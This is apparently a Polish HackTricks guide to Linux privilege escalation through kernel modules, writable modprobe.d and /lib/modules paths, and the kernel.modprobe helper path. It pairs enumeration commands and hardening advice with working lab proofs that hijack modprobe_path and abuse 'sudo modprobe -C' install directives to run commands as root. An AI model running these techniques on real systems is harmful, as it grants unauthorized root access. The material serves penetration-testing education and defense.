# Nadużycia Kernel Modules i modprobe

{{#include ../../banners/hacktricks-training.md}}

## Błędne konfiguracje Kernel module i ładowania modułów

Obsługa Kernel module to obszar o dużym wpływie podczas przeglądu eskalacji uprawnień w Linuxie. Nie traktuj każdego komunikatu o niepodpisanym module jako exploitable samodzielnie, ale wykorzystaj go do uzyskania odpowiedzi na praktyczne pytania.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Czy bieżący użytkownik może ładować moduły przez `sudo`, capabilities lub zapisywalną ścieżkę helpera?
- Czy ładowanie modułów jest nadal włączone?
- Czy wymuszanie podpisów modułów jest wyłączone?
- Czy katalogi modułów, pliki modułów lub ścieżki konfiguracji `modprobe.d` są zapisywalne?<sup>[[16]](#references)</sup>
- Czy można odczytywać logi kernela, aby potwierdzić, co się wydarzyło?

Szybki triage rozpoczyna się od poniższych kontroli statusu modułów, podpisów, logowania i drzewa modułów.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Interpretacja:

- `modules_disabled=1` oznacza, że modułów nie można ani ładować, ani usuwać, a wartość nie może zostać zresetowana do `0` aż do ponownego uruchomienia systemu.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` w wierszu poleceń kernela lub `CONFIG_MODULE_SIG_FORCE=y` wymaga poprawnie podpisanych modułów; w przeciwnym razie niepodpisane moduły mogą zostać załadowane i oznaczyć kernel jako skażony.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` nie nakłada żadnych ograniczeń na `dmesg`; gdy ustawiona jest wartość `1`, dostęp wymaga `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Zapisywalne ścieżki w `/lib/modules/$(uname -r)/` są niebezpieczne, ponieważ `modprobe` przeszukuje to drzewo oraz dane zależności podczas ładowania modułów.<sup>[[8]](#references)</sup>

### Ładowanie modułu i odczytywanie outputu kernela

Jeśli masz uzasadnione uprawnienia do załadowania lokalnego modułu, `insmod` wstawia dokładny podany przez Ciebie plik `.ko`. Funkcja init modułu jest uruchamiana w ramach ładowania, a komunikaty zapisywane za pomocą `printk()` trafiają do bufora logów kernela, który jest zwykle odczytywany za pomocą `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Minimalny workflow weryfikacyjny wykorzystuje `modinfo` do sprawdzania metadanych, `insmod` i `rmmod` do ładowania oraz usuwania modułu, `lsmod` do potwierdzania stanu załadowania, a `dmesg` do sprawdzania logów kernela.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Jeśli `sudo -l` zezwala na użycie `insmod`, `modprobe` lub wrappera wokół nich, należy traktować to jako krytyczne: `sudo -l` wyświetla uprawnienia wywołującego użytkownika, a załadowanie modułu kernela wymaga `CAP_SYS_MODULE`. Zobacz [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module), aby poznać bezpośrednie ścieżki oparte na capabilities.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### `insmod` dozwolony przez sudo

Reguła sudo pozwalająca użytkownikowi uruchamiać `insmod` nie jest porównywalna z zezwoleniem na używanie zwykłego pomocnika administracyjnego. Kod inicjalizacyjny modułu jest uruchamiany w ramach jego wstawiania, dlatego praktyczne pytanie podczas przeglądu brzmi: czy ten użytkownik może wybrać lub zmodyfikować ładowany moduł?<sup>[[3]](#references)</sup>

Poniższy ogólny przebieg przeglądu powtarza kontrole inspekcji, ładowania, stanu, logów i usuwania dla wybranego modułu.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Jeśli użytkownik może dostarczyć dowolny plik `.ko`, w ramach autoryzowanej oceny należy traktować tę regułę jako prowadzącą do pełnego przejęcia systemu. Bezpieczniejszym wzorcem operacyjnym jest unikanie delegowania ładowania modułów przez sudo; jeśli jest to nieuniknione, należy ograniczyć dokładną ścieżkę, właściciela, uprawnienia, politykę podpisywania oraz procedurę usuwania.<sup>[[3]](#references)[[10]](#references)</sup>

W przypadku nieszkodliwego wzorca budowania modułu w kontrolowanym laboratorium poniżej przedstawiono minimalny kod źródłowy i Makefile; forma `make -C /lib/modules/$(uname -r)/build M=$PWD` jest zgodna z udokumentowanym przez kernel przepływem pracy kbuild dla modułów zewnętrznych.<sup>[[5]](#references)[[7]](#references)</sup>
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Buduj i ładuj wyłącznie w autoryzowanym laboratorium; kbuild kompiluje zewnętrzny moduł, a polecenia ładowania/usuwania wywołują interfejsy modułów jądra.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Kontrole nadużycia `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` określa nazwę helpera userspace, który kernel wykonuje w odpowiedzi na żądania automatycznego ładowania modułów; ten sysctl wpływa na automatyczne ładowanie, a nie na jawne wstawianie modułów. Jeśli attacker może zmienić tę wartość na ścieżkę do zapisywalnego pliku wykonywalnego i wywołać żądanie modułu, ten helper staje się uprzywilejowaną ścieżką wykonania kodu. Ustawienie pustego ciągu wyłącza żądania automatycznego ładowania; jeśli `CONFIG_STATIC_USERMODEHELPER=y`, niepusta wartość zostaje zastąpiona skompilowaną ścieżką static helpera.<sup>[[1]](#references)</sup>

Sprawdź bieżącą ścieżkę helpera za pośrednictwem interfejsu kernel sysctl i sprawdź właściciela oraz uprawnienia celu.<sup>[[1]](#references)</sup>
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Sprawdź, czy można modyfikować ustawienia sysctl, delegowane reguły sudo lub capabilities plików.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Poniższy wzorzec, przeznaczony wyłącznie do laboratorium, zmienia ścieżkę helpera i wyzwala udokumentowane żądanie automatycznego ładowania modułu; używaj go wyłącznie w izolowanym, autoryzowanym systemie.<sup>[[1]](#references)</sup>

W aktualnych jądrach Linux nie używaj nieznanego pliku wykonywalnego jako ogólnego wyzwalacza: starszy mechanizm automatycznego ładowania modułów dla niestandardowych formatów binarnych został usunięty w Linux 6.14, natomiast dokumentacja jądra wskazuje nieznany typ systemu plików jako ścieżkę żądania automatycznego ładowania modułu.<sup>[[1]](#references)[[11]](#references)</sup>
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
W zahardowanych systemach powinno to zakończyć się niepowodzeniem, gdy uprawnienia uniemożliwiają niezaufanym użytkownikom zapis do `kernel.modprobe`, ścieżka helpera nie pozwala na zapis lub automatyczne ładowanie modułów jest wyłączone.<sup>[[1]](#references)</sup>

### Zapisywalna konfiguracja `modprobe.d` i `sudo modprobe -C`

Przed rozwiązaniem modułu `modprobe` odczytuje pliki `.conf` z katalogów konfiguracyjnych, takich jak `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` i `/lib/modprobe.d`, zgodnie z kolejnością pierwszeństwa. Plik o tej samej nazwie w katalogu o wyższym priorytecie przesłania plik z katalogu o niższym priorytecie. Co ważniejsze, dyrektywa `install <module> <command>` uruchamia dowolne polecenie powłoki **zamiast** wstawiania tego modułu. Dlatego zapisywalna ścieżka konfiguracji może stać się opóźnionym wykonaniem polecenia z uprawnieniami późniejszego uprzywilejowanego wywołującego `modprobe`; wymuszanie podpisów modułów jądra nie uwierzytelnia tego polecenia userspace.<sup>[[16]](#references)</sup>

Sprawdź uprawnienia katalogów i plików, a następnie przeanalizuj efektywną konfigurację. `modprobe -n -v` jest bezpieczne do przeglądu rozwiązywania, ponieważ tryb dry-run nie wstawia modułu ani nie wykonuje polecenia `install`/`remove`. Preferuj `modprobe -c` zamiast starszej składni `--showconfig`, której usunięcie po kmod 36 jest obecnie oznaczone w dokumentacji kmod.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
[ -e "$d" ] || continue
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
/etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
/usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```
Nieograniczona reguła sudo dla `modprobe` jest podatna na exploitację nawet wtedy, gdy dowolne pliki `.ko` nie przechodzą weryfikacji podpisu: `-C` wskazuje kontrolowany przez atakującego katalog konfiguracji, z którego proces uruchomiony przez sudo może wykonać polecenie `install`.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```
W ramach mitigation nie przyznawaj przez sudo dostępu do `modprobe` bez ograniczeń dotyczących argumentów, zachowaj własność root i brak możliwości zapisu dla każdego katalogu konfiguracyjnego oraz sprawdzaj nieoczekiwane dyrektywy `install`/`remove`. Gdy zaufany workflow administracyjny musi pominąć takie dyrektywy dla jednego modułu, `modprobe --ignore-install` ignoruje je dla wskazanego modułu, ale zależności nadal mogą mieć własne polecenia.<sup>[[8]](#references)[[16]](#references)</sup>

### Przegląd zapisywalnego `/lib/modules`

Zapisywalne katalogi modułów mogą umożliwiać zastępowanie modułów, umieszczanie złośliwych modułów lub nadużywanie automatycznego ładowania — zależnie od sposobu późniejszego wywołania `modprobe`; `modprobe` przeszukuje `/lib/modules/$(uname -r)` i używa danych zależności podczas rozwiązywania modułów.<sup>[[8]](#references)</sup>

Sprawdź zapisywalne pliki modułów oraz metadane zależności/aliasów w drzewie modułów aktywnej wersji kernela.<sup>[[8]](#references)</sup>
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Jeśli znajdziesz zawartość modułu z możliwością zapisu, sprawdź, jak `modprobe` rozwiązuje zależności i jak `modinfo` zgłasza metadane modułu.<sup>[[8]](#references)[[12]](#references)</sup>
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Uwagi dotyczące obrony:

- Utrzymuj `/lib/modules` jako własność `root:root` i bez możliwości zapisu przez użytkowników.<sup>[[8]](#references)</sup>
- Ustaw `kernel.modules_disabled=1` po uruchomieniu systemu, jeśli jest to możliwe operacyjnie.<sup>[[1]](#references)</sup>
- Wymuś podpisywanie modułów w systemach wymagających modułów ładowalnych.<sup>[[2]](#references)</sup>
- Monitoruj zapisy do `/proc/sys/kernel/modprobe`, `/lib/modules` i katalogów konfiguracji `modprobe.d`, a także nieoczekiwane wykonywanie `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## References

- [1] [Dokumentacja /proc/sys/kernel/ — Dokumentacja jądra Linux](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Mechanizm podpisywania modułów jądra — Dokumentacja jądra Linux](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — strona podręcznika Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Podstawy sterowników — Dokumentacja jądra Linux](https://docs.kernel.org/driver-api/basics.html)
- [6] [Logowanie komunikatów za pomocą printk — Dokumentacja jądra Linux](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Budowanie modułów zewnętrznych — Dokumentacja jądra Linux](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — strona podręcznika Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Scal tag „execve-v6.14-rc1” — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — strona podręcznika Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
